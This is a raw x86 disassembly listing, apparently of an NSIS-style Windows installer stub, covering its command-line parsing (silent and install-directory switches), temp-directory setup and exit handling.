  4033eb:	53                   	push   %ebx
  4033ec:	55                   	push   %ebp
  4033ed:	ff 15 10 81 40 00    	call   *0x408110
  4033f3:	89 46 3c             	mov    %eax,0x3c(%esi)
  4033f6:	8d 46 04             	lea    0x4(%esi),%eax
  4033f9:	6a 40                	push   $0x40
  4033fb:	50                   	push   %eax
  4033fc:	68 20 40 42 00       	push   $0x424020
  403401:	e8 50 2f 00 00       	call   0x406356
  403406:	33 c0                	xor    %eax,%eax
  403408:	eb 0d                	jmp    0x403417
  40340a:	6a 01                	push   $0x1
  40340c:	e8 4a fd ff ff       	call   0x40315b
  403411:	59                   	pop    %ecx
  403412:	b8 d8 82 40 00       	mov    $0x4082d8,%eax
  403417:	5f                   	pop    %edi
  403418:	5e                   	pop    %esi
  403419:	5d                   	pop    %ebp
  40341a:	5b                   	pop    %ebx
  40341b:	83 c4 24             	add    $0x24,%esp
  40341e:	c2 04 00             	ret    $0x4
  403421:	55                   	push   %ebp
  403422:	8b ec                	mov    %esp,%ebp
  403424:	83 ec 40             	sub    $0x40,%esp
  403427:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  40342e:	75 14                	jne    0x403444
  403430:	6a 00                	push   $0x0
  403432:	68 fa 00 00 00       	push   $0xfa
  403437:	6a 01                	push   $0x1
  403439:	ff 75 08             	push   0x8(%ebp)
  40343c:	ff 15 00 82 40 00    	call   *0x408200
  403442:	eb 09                	jmp    0x40344d
  403444:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  40344b:	75 4e                	jne    0x40349b
  40344d:	8b 0d 28 b5 40 00    	mov    0x40b528,%ecx
  403453:	39 0d 2c b5 40 00    	cmp    %ecx,0x40b52c
  403459:	51                   	push   %ecx
  40345a:	0f 42 0d 2c b5 40 00 	cmovb  0x40b52c,%ecx
  403461:	6a 64                	push   $0x64
  403463:	51                   	push   %ecx
  403464:	ff 15 e8 80 40 00    	call   *0x4080e8
  40346a:	50                   	push   %eax
  40346b:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40346e:	68 9c 82 40 00       	push   $0x40829c
  403473:	50                   	push   %eax
  403474:	ff 15 44 82 40 00    	call   *0x408244
  40347a:	83 c4 0c             	add    $0xc,%esp
  40347d:	8d 45 c0             	lea    -0x40(%ebp),%eax
  403480:	50                   	push   %eax
  403481:	ff 75 08             	push   0x8(%ebp)
  403484:	ff 15 fc 81 40 00    	call   *0x4081fc
  40348a:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40348d:	50                   	push   %eax
  40348e:	68 06 04 00 00       	push   $0x406
  403493:	ff 75 08             	push   0x8(%ebp)
  403496:	e8 21 33 00 00       	call   0x4067bc
  40349b:	33 c0                	xor    %eax,%eax
  40349d:	c9                   	leave
  40349e:	c2 10 00             	ret    $0x10
  4034a1:	a1 10 a0 40 00       	mov    0x40a010,%eax
  4034a6:	83 f8 ff             	cmp    $0xffffffff,%eax
  4034a9:	74 0e                	je     0x4034b9
  4034ab:	50                   	push   %eax
  4034ac:	ff 15 08 81 40 00    	call   *0x408108
  4034b2:	83 0d 10 a0 40 00 ff 	orl    $0xffffffff,0x40a010
  4034b9:	e8 45 06 00 00       	call   0x403b03
  4034be:	6a 07                	push   $0x7
  4034c0:	68 00 b8 42 00       	push   $0x42b800
  4034c5:	e8 f1 2e 00 00       	call   0x4063bb
  4034ca:	c3                   	ret
  4034cb:	81 ec 18 02 00 00    	sub    $0x218,%esp
  4034d1:	53                   	push   %ebx
  4034d2:	55                   	push   %ebp
  4034d3:	56                   	push   %esi
  4034d4:	57                   	push   %edi
  4034d5:	33 db                	xor    %ebx,%ebx
  4034d7:	bf 08 84 40 00       	mov    $0x408408,%edi
  4034dc:	68 01 80 00 00       	push   $0x8001
  4034e1:	89 5c 24 14          	mov    %ebx,0x14(%esp)
  4034e5:	8b eb                	mov    %ebx,%ebp
  4034e7:	ff 15 60 81 40 00    	call   *0x408160
  4034ed:	8b 35 a4 80 40 00    	mov    0x4080a4,%esi
  4034f3:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  4034f7:	0f 57 c0             	xorps  %xmm0,%xmm0
  4034fa:	89 5c 24 40          	mov    %ebx,0x40(%esp)
  4034fe:	50                   	push   %eax
  4034ff:	66 0f 13 84 24 c4 00 	movlpd %xmm0,0xc4(%esp)
  403506:	00 00 
  403508:	c7 44 24 30 9c 00 00 	movl   $0x9c,0x30(%esp)
  40350f:	00 
  403510:	ff d6                	call   *%esi
  403512:	85 c0                	test   %eax,%eax
  403514:	75 3f                	jne    0x403555
  403516:	8d 44 24 2c          	lea    0x2c(%esp),%eax
  40351a:	c7 44 24 2c 94 00 00 	movl   $0x94,0x2c(%esp)
  403521:	00 
  403522:	50                   	push   %eax
  403523:	ff d6                	call   *%esi
  403525:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  403529:	83 f8 02             	cmp    $0x2,%eax
  40352c:	75 2e                	jne    0x40355c
  40352e:	80 7c 24 40 53       	cmpb   $0x53,0x40(%esp)
  403533:	c6 84 24 c6 00 00 00 	movb   $0x4,0xc6(%esp)
  40353a:	04 
  40353b:	75 0c                	jne    0x403549
  40353d:	66 0f be 44 24 4d    	movsbw 0x4d(%esp),%ax
  403543:	66 83 e8 30          	sub    $0x30,%ax
  403547:	eb 2e                	jmp    0x403577
  403549:	33 c9                	xor    %ecx,%ecx
  40354b:	66 89 8c 24 c0 00 00 	mov    %cx,0xc0(%esp)
  403552:	00 
  403553:	eb 04                	jmp    0x403559
  403555:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  403559:	83 f8 02             	cmp    $0x2,%eax
  40355c:	73 21                	jae    0x40357f
  40355e:	8a 44 24 41          	mov    0x41(%esp),%al
  403562:	88 9c 24 c6 00 00 00 	mov    %bl,0xc6(%esp)
  403569:	3c 41                	cmp    $0x41,%al
  40356b:	7c 08                	jl     0x403575
  40356d:	66 98                	cbtw
  40356f:	66 83 e8 40          	sub    $0x40,%ax
  403573:	eb 02                	jmp    0x403577
  403575:	33 c0                	xor    %eax,%eax
  403577:	66 89 84 24 c0 00 00 	mov    %ax,0xc0(%esp)
  40357e:	00 
  40357f:	83 7c 24 30 0a       	cmpl   $0xa,0x30(%esp)
  403584:	73 0b                	jae    0x403591
  403586:	0f b7 44 24 38       	movzwl 0x38(%esp),%eax
  40358b:	89 44 24 38          	mov    %eax,0x38(%esp)
  40358f:	eb 04                	jmp    0x403595
  403591:	8b 44 24 38          	mov    0x38(%esp),%eax
  403595:	a3 f8 40 42 00       	mov    %eax,0x4240f8
  40359a:	0f b6 44 24 30       	movzbl 0x30(%esp),%eax
  40359f:	66 c1 e0 08          	shl    $0x8,%ax
  4035a3:	0f b7 c8             	movzwl %ax,%ecx
  4035a6:	0f b6 44 24 34       	movzbl 0x34(%esp),%eax
  4035ab:	0b c8                	or     %eax,%ecx
  4035ad:	0f b6 84 24 c0 00 00 	movzbl 0xc0(%esp),%eax
  4035b4:	00 
  4035b5:	66 c1 e0 08          	shl    $0x8,%ax
  4035b9:	c1 e1 10             	shl    $0x10,%ecx
  4035bc:	0f b7 c0             	movzwl %ax,%eax
  4035bf:	0b c8                	or     %eax,%ecx
  4035c1:	0f b6 84 24 c6 00 00 	movzbl 0xc6(%esp),%eax
  4035c8:	00 
  4035c9:	0b c8                	or     %eax,%ecx
  4035cb:	b8 00 06 00 00       	mov    $0x600,%eax
  4035d0:	89 0d fc 40 42 00    	mov    %ecx,0x4240fc
  4035d6:	c1 f9 10             	sar    $0x10,%ecx
  4035d9:	66 3b c8             	cmp    %ax,%cx
  4035dc:	74 11                	je     0x4035ef
  4035de:	53                   	push   %ebx
  4035df:	e8 bf 2f 00 00       	call   0x4065a3
  4035e4:	85 c0                	test   %eax,%eax
  4035e6:	74 07                	je     0x4035ef
  4035e8:	68 00 0c 00 00       	push   $0xc00
  4035ed:	ff d0                	call   *%eax
  4035ef:	be b0 83 40 00       	mov    $0x4083b0,%esi
  4035f4:	56                   	push   %esi
  4035f5:	e8 0e 29 00 00       	call   0x405f08
  4035fa:	56                   	push   %esi
  4035fb:	ff 15 a0 80 40 00    	call   *0x4080a0
  403601:	46                   	inc    %esi
  403602:	03 f0                	add    %eax,%esi
  403604:	38 1e                	cmp    %bl,(%esi)
  403606:	75 ec                	jne    0x4035f4
  403608:	6a 0c                	push   $0xc
  40360a:	e8 94 2f 00 00       	call   0x4065a3
  40360f:	6a 0a                	push   $0xa
  403611:	e8 8d 2f 00 00       	call   0x4065a3
  403616:	6a 08                	push   $0x8
  403618:	a3 f0 37 42 00       	mov    %eax,0x4237f0
  40361d:	e8 81 2f 00 00       	call   0x4065a3
  403622:	85 c0                	test   %eax,%eax
  403624:	74 0f                	je     0x403635
  403626:	6a 1e                	push   $0x1e
  403628:	ff d0                	call   *%eax
  40362a:	85 c0                	test   %eax,%eax
  40362c:	74 07                	je     0x403635
  40362e:	80 0d fc 40 42 00 80 	orb    $0x80,0x4240fc
  403635:	ff 15 34 80 40 00    	call   *0x408034
  40363b:	53                   	push   %ebx
  40363c:	ff 15 84 82 40 00    	call   *0x408284
  403642:	53                   	push   %ebx
  403643:	68 60 01 00 00       	push   $0x160
  403648:	a3 60 40 42 00       	mov    %eax,0x424060
  40364d:	8d 84 24 d0 00 00 00 	lea    0xd0(%esp),%eax
  403654:	50                   	push   %eax
  403655:	53                   	push   %ebx
  403656:	68 4b 84 40 00       	push   $0x40844b
  40365b:	ff 15 74 81 40 00    	call   *0x408174
  403661:	68 4c 84 40 00       	push   $0x40844c
  403666:	68 00 38 42 00       	push   $0x423800
  40366b:	e8 58 31 00 00       	call   0x4067c8
  403670:	ff 15 c0 80 40 00    	call   *0x4080c0
  403676:	50                   	push   %eax
  403677:	bb 00 a0 42 00       	mov    $0x42a000,%ebx
  40367c:	53                   	push   %ebx
  40367d:	e8 46 31 00 00       	call   0x4067c8
  403682:	80 3d 00 a0 42 00 22 	cmpb   $0x22,0x42a000
  403689:	ba 01 a0 42 00       	mov    $0x42a001,%edx
  40368e:	c7 05 f4 37 42 00 00 	movl   $0x400000,0x4237f4
  403695:	00 40 00 
  403698:	0f 94 c0             	sete   %al
  40369b:	8d 04 45 20 00 00 00 	lea    0x20(,%eax,2),%eax
  4036a2:	50                   	push   %eax
  4036a3:	8b c3                	mov    %ebx,%eax
  4036a5:	0f 44 c2             	cmove  %edx,%eax
  4036a8:	50                   	push   %eax
  4036a9:	e8 f4 2b 00 00       	call   0x4062a2
  4036ae:	50                   	push   %eax
  4036af:	ff 15 f4 81 40 00    	call   *0x4081f4
  4036b5:	8b c8                	mov    %eax,%ecx
  4036b7:	8b d9                	mov    %ecx,%ebx
  4036b9:	89 5c 24 18          	mov    %ebx,0x18(%esp)
  4036bd:	8a 11                	mov    (%ecx),%dl
  4036bf:	84 d2                	test   %dl,%dl
  4036c1:	0f 84 96 00 00 00    	je     0x40375d
  4036c7:	eb 03                	jmp    0x4036cc
  4036c9:	41                   	inc    %ecx
  4036ca:	8a 11                	mov    (%ecx),%dl
  4036cc:	80 fa 20             	cmp    $0x20,%dl
  4036cf:	74 f8                	je     0x4036c9
  4036d1:	c6 44 24 14 20       	movb   $0x20,0x14(%esp)
  4036d6:	8a da                	mov    %dl,%bl
  4036d8:	80 fa 22             	cmp    $0x22,%dl
  4036db:	75 07                	jne    0x4036e4
  4036dd:	8a 59 01             	mov    0x1(%ecx),%bl
  4036e0:	88 54 24 14          	mov    %dl,0x14(%esp)
  4036e4:	8d 41 01             	lea    0x1(%ecx),%eax
  4036e7:	0f 45 c1             	cmovne %ecx,%eax
  4036ea:	80 fb 2f             	cmp    $0x2f,%bl
  4036ed:	75 3c                	jne    0x40372b
  4036ef:	40                   	inc    %eax
  4036f0:	80 38 53             	cmpb   $0x53,(%eax)
  4036f3:	75 16                	jne    0x40370b
  4036f5:	8a 48 01             	mov    0x1(%eax),%cl
  4036f8:	80 f9 20             	cmp    $0x20,%cl
  4036fb:	74 04                	je     0x403701
  4036fd:	84 c9                	test   %cl,%cl
  4036ff:	75 0a                	jne    0x40370b
  403701:	c7 05 e0 40 42 00 01 	movl   $0x1,0x4240e0
  403708:	00 00 00 
  40370b:	81 38 4e 43 52 43    	cmpl   $0x4352434e,(%eax)
  403711:	75 0f                	jne    0x403722
  403713:	8a 48 04             	mov    0x4(%eax),%cl
  403716:	80 f9 20             	cmp    $0x20,%cl
  403719:	74 04                	je     0x40371f
  40371b:	84 c9                	test   %cl,%cl
  40371d:	75 03                	jne    0x403722
  40371f:	83 cd 04             	or     $0x4,%ebp
  403722:	81 78 fe 20 2f 44 3d 	cmpl   $0x3d442f20,-0x2(%eax)
  403729:	74 1c                	je     0x403747
  40372b:	ff 74 24 14          	push   0x14(%esp)
  40372f:	50                   	push   %eax
  403730:	e8 6d 2b 00 00       	call   0x4062a2
  403735:	8b c8                	mov    %eax,%ecx
  403737:	8a 11                	mov    (%ecx),%dl
  403739:	80 fa 22             	cmp    $0x22,%dl
  40373c:	75 03                	jne    0x403741
  40373e:	41                   	inc    %ecx
  40373f:	8a 11                	mov    (%ecx),%dl
  403741:	84 d2                	test   %dl,%dl
  403743:	75 87                	jne    0x4036cc
  403745:	eb 12                	jmp    0x403759
  403747:	c6 40 fe 00          	movb   $0x0,-0x2(%eax)
  40374b:	83 c0 02             	add    $0x2,%eax
  40374e:	50                   	push   %eax
  40374f:	68 00 a4 42 00       	push   $0x42a400
  403754:	e8 6f 30 00 00       	call   0x4067c8
  403759:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  40375d:	8b 35 b8 80 40 00    	mov    0x4080b8,%esi
  403763:	68 00 b4 42 00       	push   $0x42b400
  403768:	68 00 04 00 00       	push   $0x400
  40376d:	ff d6                	call   *%esi
  40376f:	e8 21 03 00 00       	call   0x403a95
  403774:	85 c0                	test   %eax,%eax
  403776:	75 6b                	jne    0x4037e3
  403778:	68 fb 03 00 00       	push   $0x3fb
  40377d:	68 00 b4 42 00       	push   $0x42b400
  403782:	ff 15 a8 80 40 00    	call   *0x4080a8
  403788:	68 58 84 40 00       	push   $0x408458
  40378d:	68 00 b4 42 00       	push   $0x42b400
  403792:	e8 2b 30 00 00       	call   0x4067c2
  403797:	e8 f9 02 00 00       	call   0x403a95
  40379c:	85 c0                	test   %eax,%eax
  40379e:	75 43                	jne    0x4037e3
  4037a0:	68 00 b4 42 00       	push   $0x42b400
  4037a5:	68 fc 03 00 00       	push   $0x3fc
  4037aa:	ff d6                	call   *%esi
  4037ac:	68 60 84 40 00       	push   $0x408460
  4037b1:	be 00 b4 42 00       	mov    $0x42b400,%esi
  4037b6:	56                   	push   %esi
  4037b7:	e8 06 30 00 00       	call   0x4067c2
  4037bc:	56                   	push   %esi
  4037bd:	8b 35 bc 80 40 00    	mov    0x4080bc,%esi
  4037c3:	68 64 84 40 00       	push   $0x408464
  4037c8:	ff d6                	call   *%esi
  4037ca:	68 00 b4 42 00       	push   $0x42b400
  4037cf:	68 6c 84 40 00       	push   $0x40846c
  4037d4:	ff d6                	call   *%esi
  4037d6:	e8 ba 02 00 00       	call   0x403a95
  4037db:	85 c0                	test   %eax,%eax
  4037dd:	0f 84 cd 01 00 00    	je     0x4039b0
  4037e3:	68 00 b0 42 00       	push   $0x42b000
  4037e8:	ff 15 2c 81 40 00    	call   *0x40812c
  4037ee:	55                   	push   %ebp
  4037ef:	e8 cb f9 ff ff       	call   0x4031bf
  4037f4:	8b f8                	mov    %eax,%edi
  4037f6:	85 ff                	test   %edi,%edi
  4037f8:	0f 85 b2 01 00 00    	jne    0x4039b0
  4037fe:	39 05 04 40 42 00    	cmp    %eax,0x424004
  403804:	74 52                	je     0x403858
  403806:	50                   	push   %eax
  403807:	bd 00 a0 42 00       	mov    $0x42a000,%ebp
  40380c:	55                   	push   %ebp
  40380d:	e8 90 2a 00 00       	call   0x4062a2
  403812:	8b f0                	mov    %eax,%esi
  403814:	eb 09                	jmp    0x40381f
  403816:	81 3e 20 5f 3f 3d    	cmpl   $0x3d3f5f20,(%esi)
  40381c:	74 05                	je     0x403823
  40381e:	4e                   	dec    %esi
  40381f:	3b f5                	cmp    %ebp,%esi
  403821:	73 f3                	jae    0x403816
  403823:	bf b8 82 40 00       	mov    $0x4082b8,%edi
  403828:	3b f5                	cmp    %ebp,%esi
  40382a:	72 3f                	jb     0x40386b
  40382c:	c6 06 00             	movb   $0x0,(%esi)
  40382f:	83 c6 04             	add    $0x4,%esi
  403832:	56                   	push   %esi
  403833:	e8 a7 2a 00 00       	call   0x4062df
  403838:	85 c0                	test   %eax,%eax
  40383a:	0f 84 70 01 00 00    	je     0x4039b0
  403840:	56                   	push   %esi
  403841:	68 00 a4 42 00       	push   $0x42a400
  403846:	e8 7d 2f 00 00       	call   0x4067c8
  40384b:	56                   	push   %esi
  40384c:	68 00 a8 42 00       	push   $0x42a800
  403851:	e8 72 2f 00 00       	call   0x4067c8
  403856:	33 ff                	xor    %edi,%edi
  403858:	83 0d ec 40 42 00 ff 	orl    $0xffffffff,0x4240ec
  40385f:	e8 1d 1f 00 00       	call   0x405781
  403864:	8b d8                	mov    %eax,%ebx
  403866:	e9 49 01 00 00       	jmp    0x4039b4
  40386b:	e8 3a 29 00 00       	call   0x4061aa
  403870:	68 00 b4 42 00       	push   $0x42b400
  403875:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403879:	e8 60 2f 00 00       	call   0x4067de
  40387e:	53                   	push   %ebx
  40387f:	68 00 50 42 00       	push   $0x425000
  403884:	8b f0                	mov    %eax,%esi
  403886:	e8 3d 2f 00 00       	call   0x4067c8
  40388b:	80 3d 00 a4 42 00 00 	cmpb   $0x0,0x42a400
  403892:	75 0f                	jne    0x4038a3
  403894:	68 00 ac 42 00       	push   $0x42ac00
  403899:	68 00 a4 42 00       	push   $0x42a400
  40389e:	e8 25 2f 00 00       	call   0x4067c8
  4038a3:	33 db                	xor    %ebx,%ebx
  4038a5:	8d 86 00 b4 42 00    	lea    0x42b400(%esi),%eax
  4038ab:	43                   	inc    %ebx
  4038ac:	89 44 24 14          	mov    %eax,0x14(%esp)
  4038b0:	33 f6                	xor    %esi,%esi
  4038b2:	0f b7 eb             	movzwl %bx,%ebp
  4038b5:	55                   	push   %ebp
  4038b6:	68 70 84 40 00       	push   $0x408470
  4038bb:	50                   	push   %eax
  4038bc:	ff 15 44 82 40 00    	call   *0x408244
  4038c2:	a1 10 40 42 00       	mov    0x424010,%eax
  4038c7:	83 c4 0c             	add    $0xc,%esp
  4038ca:	ff b0 20 01 00 00    	push   0x120(%eax)
  4038d0:	68 00 64 42 00       	push   $0x426400
  4038d5:	e8 2b 23 00 00       	call   0x405c05
  4038da:	83 7c 24 18 00       	cmpl   $0x0,0x18(%esp)
  4038df:	68 00 b4 42 00       	push   $0x42b400
  4038e4:	74 07                	je     0x4038ed
  4038e6:	e8 bf 22 00 00       	call   0x405baa
  4038eb:	eb 05                	jmp    0x4038f2
  4038ed:	e8 98 22 00 00       	call   0x405b8a
  4038f2:	85 c0                	test   %eax,%eax
  4038f4:	74 49                	je     0x40393f
  4038f6:	68 00 64 42 00       	push   $0x426400
  4038fb:	ff 15 1c 81 40 00    	call   *0x40811c
  403901:	a9 00 04 00 00       	test   $0x400,%eax
  403906:	0f 85 ca 00 00 00    	jne    0x4039d6
  40390c:	68 00 64 42 00       	push   $0x426400
  403911:	ff 15 2c 81 40 00    	call   *0x40812c
  403917:	85 c0                	test   %eax,%eax
  403919:	0f 84 b7 00 00 00    	je     0x4039d6
  40391f:	6a 01                	push   $0x1
  403921:	68 00 b4 42 00       	push   $0x42b400
  403926:	e8 90 2a 00 00       	call   0x4063bb
  40392b:	8b c6                	mov    %esi,%eax
  40392d:	46                   	inc    %esi
  40392e:	85 c0                	test   %eax,%eax
  403930:	0f 85 a0 00 00 00    	jne    0x4039d6
  403936:	8b 44 24 14          	mov    0x14(%esp),%eax
  40393a:	e9 76 ff ff ff       	jmp    0x4038b5
  40393f:	68 00 b4 42 00       	push   $0x42b400
  403944:	ff 15 38 81 40 00    	call   *0x408138
  40394a:	6a 00                	push   $0x0
  40394c:	68 00 b4 42 00       	push   $0x42b400
  403951:	e8 4d 26 00 00       	call   0x405fa3
  403956:	6a 01                	push   $0x1
  403958:	68 00 64 42 00       	push   $0x426400
  40395d:	68 00 bc 42 00       	push   $0x42bc00
  403962:	ff 15 9c 80 40 00    	call   *0x40809c
  403968:	85 c0                	test   %eax,%eax
  40396a:	74 44                	je     0x4039b0
  40396c:	6a 00                	push   $0x0
  40396e:	68 00 64 42 00       	push   $0x426400
  403973:	e8 2b 26 00 00       	call   0x405fa3
  403978:	a1 10 40 42 00       	mov    0x424010,%eax
  40397d:	ff b0 24 01 00 00    	push   0x124(%eax)
  403983:	68 00 68 42 00       	push   $0x426800
  403988:	e8 78 22 00 00       	call   0x405c05
  40398d:	68 00 68 42 00       	push   $0x426800
  403992:	e8 e1 29 00 00       	call   0x406378
  403997:	85 c0                	test   %eax,%eax
  403999:	75 4b                	jne    0x4039e6
  40399b:	8b c6                	mov    %esi,%eax
  40399d:	46                   	inc    %esi
  40399e:	85 c0                	test   %eax,%eax
  4039a0:	75 0e                	jne    0x4039b0
  4039a2:	68 00 64 42 00       	push   $0x426400
  4039a7:	e8 cf 28 00 00       	call   0x40627b
  4039ac:	85 c0                	test   %eax,%eax
  4039ae:	74 86                	je     0x403936
  4039b0:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  4039b4:	e8 e8 fa ff ff       	call   0x4034a1
  4039b9:	ff 15 7c 82 40 00    	call   *0x40827c
  4039bf:	85 ff                	test   %edi,%edi
  4039c1:	74 30                	je     0x4039f3
  4039c3:	68 10 00 20 00       	push   $0x200010
  4039c8:	57                   	push   %edi
  4039c9:	e8 88 2d 00 00       	call   0x406756
  4039ce:	6a 02                	push   $0x2
  4039d0:	ff 15 ac 80 40 00    	call   *0x4080ac
  4039d6:	8b 44 24 14          	mov    0x14(%esp),%eax
  4039da:	43                   	inc    %ebx
  4039db:	66 85 db             	test   %bx,%bx
  4039de:	0f 85 cc fe ff ff    	jne    0x4038b0
  4039e4:	eb ca                	jmp    0x4039b0
  4039e6:	50                   	push   %eax
  4039e7:	ff 15 08 81 40 00    	call   *0x408108
  4039ed:	33 ff                	xor    %edi,%edi
  4039ef:	8b df                	mov    %edi,%ebx
  4039f1:	eb c1                	jmp    0x4039b4
  4039f3:	83 3d d4 40 42 00 00 	cmpl   $0x0,0x4240d4
  4039fa:	0f 84 81 00 00 00    	je     0x403a81
  403a00:	8d 44 24 18          	lea    0x18(%esp),%eax
  403a04:	50                   	push   %eax
  403a05:	6a 28                	push   $0x28
  403a07:	ff 15 b0 80 40 00    	call   *0x4080b0
  403a0d:	50                   	push   %eax
  403a0e:	ff 15 1c 80 40 00    	call   *0x40801c
  403a14:	85 c0                	test   %eax,%eax
  403a16:	74 37                	je     0x403a4f
  403a18:	8d 44 24 20          	lea    0x20(%esp),%eax
  403a1c:	50                   	push   %eax
  403a1d:	68 7c 84 40 00       	push   $0x40847c
  403a22:	6a 00                	push   $0x0
  403a24:	ff 15 24 80 40 00    	call   *0x408024
  403a2a:	33 c9                	xor    %ecx,%ecx
  403a2c:	c7 44 24 1c 01 00 00 	movl   $0x1,0x1c(%esp)
  403a33:	00 
  403a34:	51                   	push   %ecx
  403a35:	51                   	push   %ecx
  403a36:	51                   	push   %ecx
  403a37:	8d 44 24 28          	lea    0x28(%esp),%eax
  403a3b:	c7 44 24 34 02 00 00 	movl   $0x2,0x34(%esp)
  403a42:	00 
  403a43:	50                   	push   %eax
  403a44:	51                   	push   %ecx
  403a45:	ff 74 24 2c          	push   0x2c(%esp)
  403a49:	ff 15 20 80 40 00    	call   *0x408020
  403a4f:	6a 04                	push   $0x4
  403a51:	e8 4d 2b 00 00       	call   0x4065a3
  403a56:	be 02 00 04 80       	mov    $0x80040002,%esi
  403a5b:	85 c0                	test   %eax,%eax
  403a5d:	74 0e                	je     0x403a6d
  403a5f:	56                   	push   %esi
  403a60:	6a 25                	push   $0x25
  403a62:	33 c9                	xor    %ecx,%ecx
  403a64:	51                   	push   %ecx
  403a65:	51                   	push   %ecx
  403a66:	51                   	push   %ecx
  403a67:	ff d0                	call   *%eax
  403a69:	85 c0                	test   %eax,%eax
  403a6b:	74 0d                	je     0x403a7a
  403a6d:	56                   	push   %esi
  403a6e:	6a 02                	push   $0x2
  403a70:	ff 15 f8 81 40 00    	call   *0x4081f8
  403a76:	85 c0                	test   %eax,%eax
  403a78:	75 07                	jne    0x403a81
  403a7a:	6a 09                	push   $0x9
  403a7c:	e8 b2 da ff ff       	call   0x401533
  403a81:	83 3d ec 40 42 00 ff 	cmpl   $0xffffffff,0x4240ec
  403a88:	0f 45 1d ec 40 42 00 	cmovne 0x4240ec,%ebx
  403a8f:	53                   	push   %ebx
  403a90:	e9 3b ff ff ff       	jmp    0x4039d0
  403a95:	56                   	push   %esi
  403a96:	be 00 b4 42 00       	mov    $0x42b400,%esi
  403a9b:	56                   	push   %esi
  403a9c:	e8 0a 2f 00 00       	call   0x4069ab
  403aa1:	56                   	push   %esi
  403aa2:	e8 b5 2f 00 00       	call   0x406a5c
  403aa7:	85 c0                	test   %eax,%eax
  403aa9:	75 02                	jne    0x403aad
  403aab:	5e                   	pop    %esi
  403aac:	c3                   	ret
  403aad:	56                   	push   %esi
  403aae:	e8 51 27 00 00       	call   0x406204
  403ab3:	56                   	push   %esi
  403ab4:	e8 d1 20 00 00       	call   0x405b8a
  403ab9:	56                   	push   %esi
  403aba:	68 00 b0 42 00       	push   $0x42b000
  403abf:	e8 4b 2c 00 00       	call   0x40670f
  403ac4:	5e                   	pop    %esi
  403ac5:	c3                   	ret
  403ac6:	a1 c0 f5 41 00       	mov    0x41f5c0,%eax
  403acb:	85 c0                	test   %eax,%eax
  403acd:	74 0f                	je     0x403ade
  403acf:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  403ad3:	39 48 08             	cmp    %ecx,0x8(%eax)
  403ad6:	74 0c                	je     0x403ae4
  403ad8:	8b 00                	mov    (%eax),%eax
  403ada:	85 c0                	test   %eax,%eax
  403adc:	75 f5                	jne    0x403ad3
  403ade:	33 c0                	xor    %eax,%eax
  403ae0:	40                   	inc    %eax
  403ae1:	c2 04 00             	ret    $0x4
  403ae4:	33 c0                	xor    %eax,%eax
  403ae6:	eb f9                	jmp    0x403ae1
  403ae8:	56                   	push   %esi
  403ae9:	8b 35 c0 f5 41 00    	mov    0x41f5c0,%esi
  403aef:	eb 0a                	jmp    0x403afb
  403af1:	ff 74 24 08          	push   0x8(%esp)
  403af5:	ff 56 04             	call   *0x4(%esi)
  403af8:	8b 36                	mov    (%esi),%esi
  403afa:	59                   	pop    %ecx
  403afb:	85 f6                	test   %esi,%esi
  403afd:	75 f2                	jne    0x403af1
  403aff:	5e                   	pop    %esi
  403b00:	c2 04 00             	ret    $0x4
  403b03:	57                   	push   %edi
  403b04:	8b 3d c0 f5 41 00    	mov    0x41f5c0,%edi
  403b0a:	6a 00                	push   $0x0
  403b0c:	e8 d7 ff ff ff       	call   0x403ae8
  403b11:	85 ff                	test   %edi,%edi
  403b13:	74 1a                	je     0x403b2f
  403b15:	56                   	push   %esi
  403b16:	8b f7                	mov    %edi,%esi
  403b18:	8b 3f                	mov    (%edi),%edi
  403b1a:	ff 76 08             	push   0x8(%esi)
  403b1d:	ff 15 00 81 40 00    	call   *0x408100
  403b23:	56                   	push   %esi
  403b24:	ff 15 f0 80 40 00    	call   *0x4080f0
  403b2a:	85 ff                	test   %edi,%edi
  403b2c:	75 e8                	jne    0x403b16
  403b2e:	5e                   	pop    %esi
  403b2f:	83 25 c0 f5 41 00 00 	andl   $0x0,0x41f5c0
  403b36:	5f                   	pop    %edi
  403b37:	c3                   	ret
  403b38:	56                   	push   %esi
  403b39:	8b 74 24 08          	mov    0x8(%esp),%esi
  403b3d:	56                   	push   %esi
  403b3e:	e8 83 ff ff ff       	call   0x403ac6
  403b43:	85 c0                	test   %eax,%eax
  403b45:	75 03                	jne    0x403b4a
  403b47:	40                   	inc    %eax
  403b48:	eb 2c                	jmp    0x403b76
  403b4a:	6a 0c                	push   $0xc
  403b4c:	6a 40                	push   $0x40
  403b4e:	ff 15 f4 80 40 00    	call   *0x4080f4
  403b54:	85 c0                	test   %eax,%eax
  403b56:	74 1b                	je     0x403b73
  403b58:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403b5c:	89 48 04             	mov    %ecx,0x4(%eax)
  403b5f:	8b 0d c0 f5 41 00    	mov    0x41f5c0,%ecx
  403b65:	89 70 08             	mov    %esi,0x8(%eax)
  403b68:	89 08                	mov    %ecx,(%eax)
  403b6a:	a3 c0 f5 41 00       	mov    %eax,0x41f5c0
  403b6f:	33 c0                	xor    %eax,%eax
  403b71:	eb 03                	jmp    0x403b76
  403b73:	83 c8 ff             	or     $0xffffffff,%eax
  403b76:	5e                   	pop    %esi
  403b77:	c2 08 00             	ret    $0x8
  403b7a:	83 ec 48             	sub    $0x48,%esp
  403b7d:	81 7c 24 50 10 01 00 	cmpl   $0x110,0x50(%esp)
  403b84:	00 
  403b85:	53                   	push   %ebx
  403b86:	55                   	push   %ebp
  403b87:	56                   	push   %esi
  403b88:	57                   	push   %edi
  403b89:	0f 85 16 01 00 00    	jne    0x403ca5
  403b8f:	8b 54 24 68          	mov    0x68(%esp),%edx
  403b93:	8b 4a 30             	mov    0x30(%edx),%ecx
  403b96:	85 c9                	test   %ecx,%ecx
  403b98:	79 11                	jns    0x403bab
  403b9a:	8d 04 8d 04 00 00 00 	lea    0x4(,%ecx,4),%eax
  403ba1:	8b 0d e0 37 42 00    	mov    0x4237e0,%ecx
  403ba7:	2b c8                	sub    %eax,%ecx
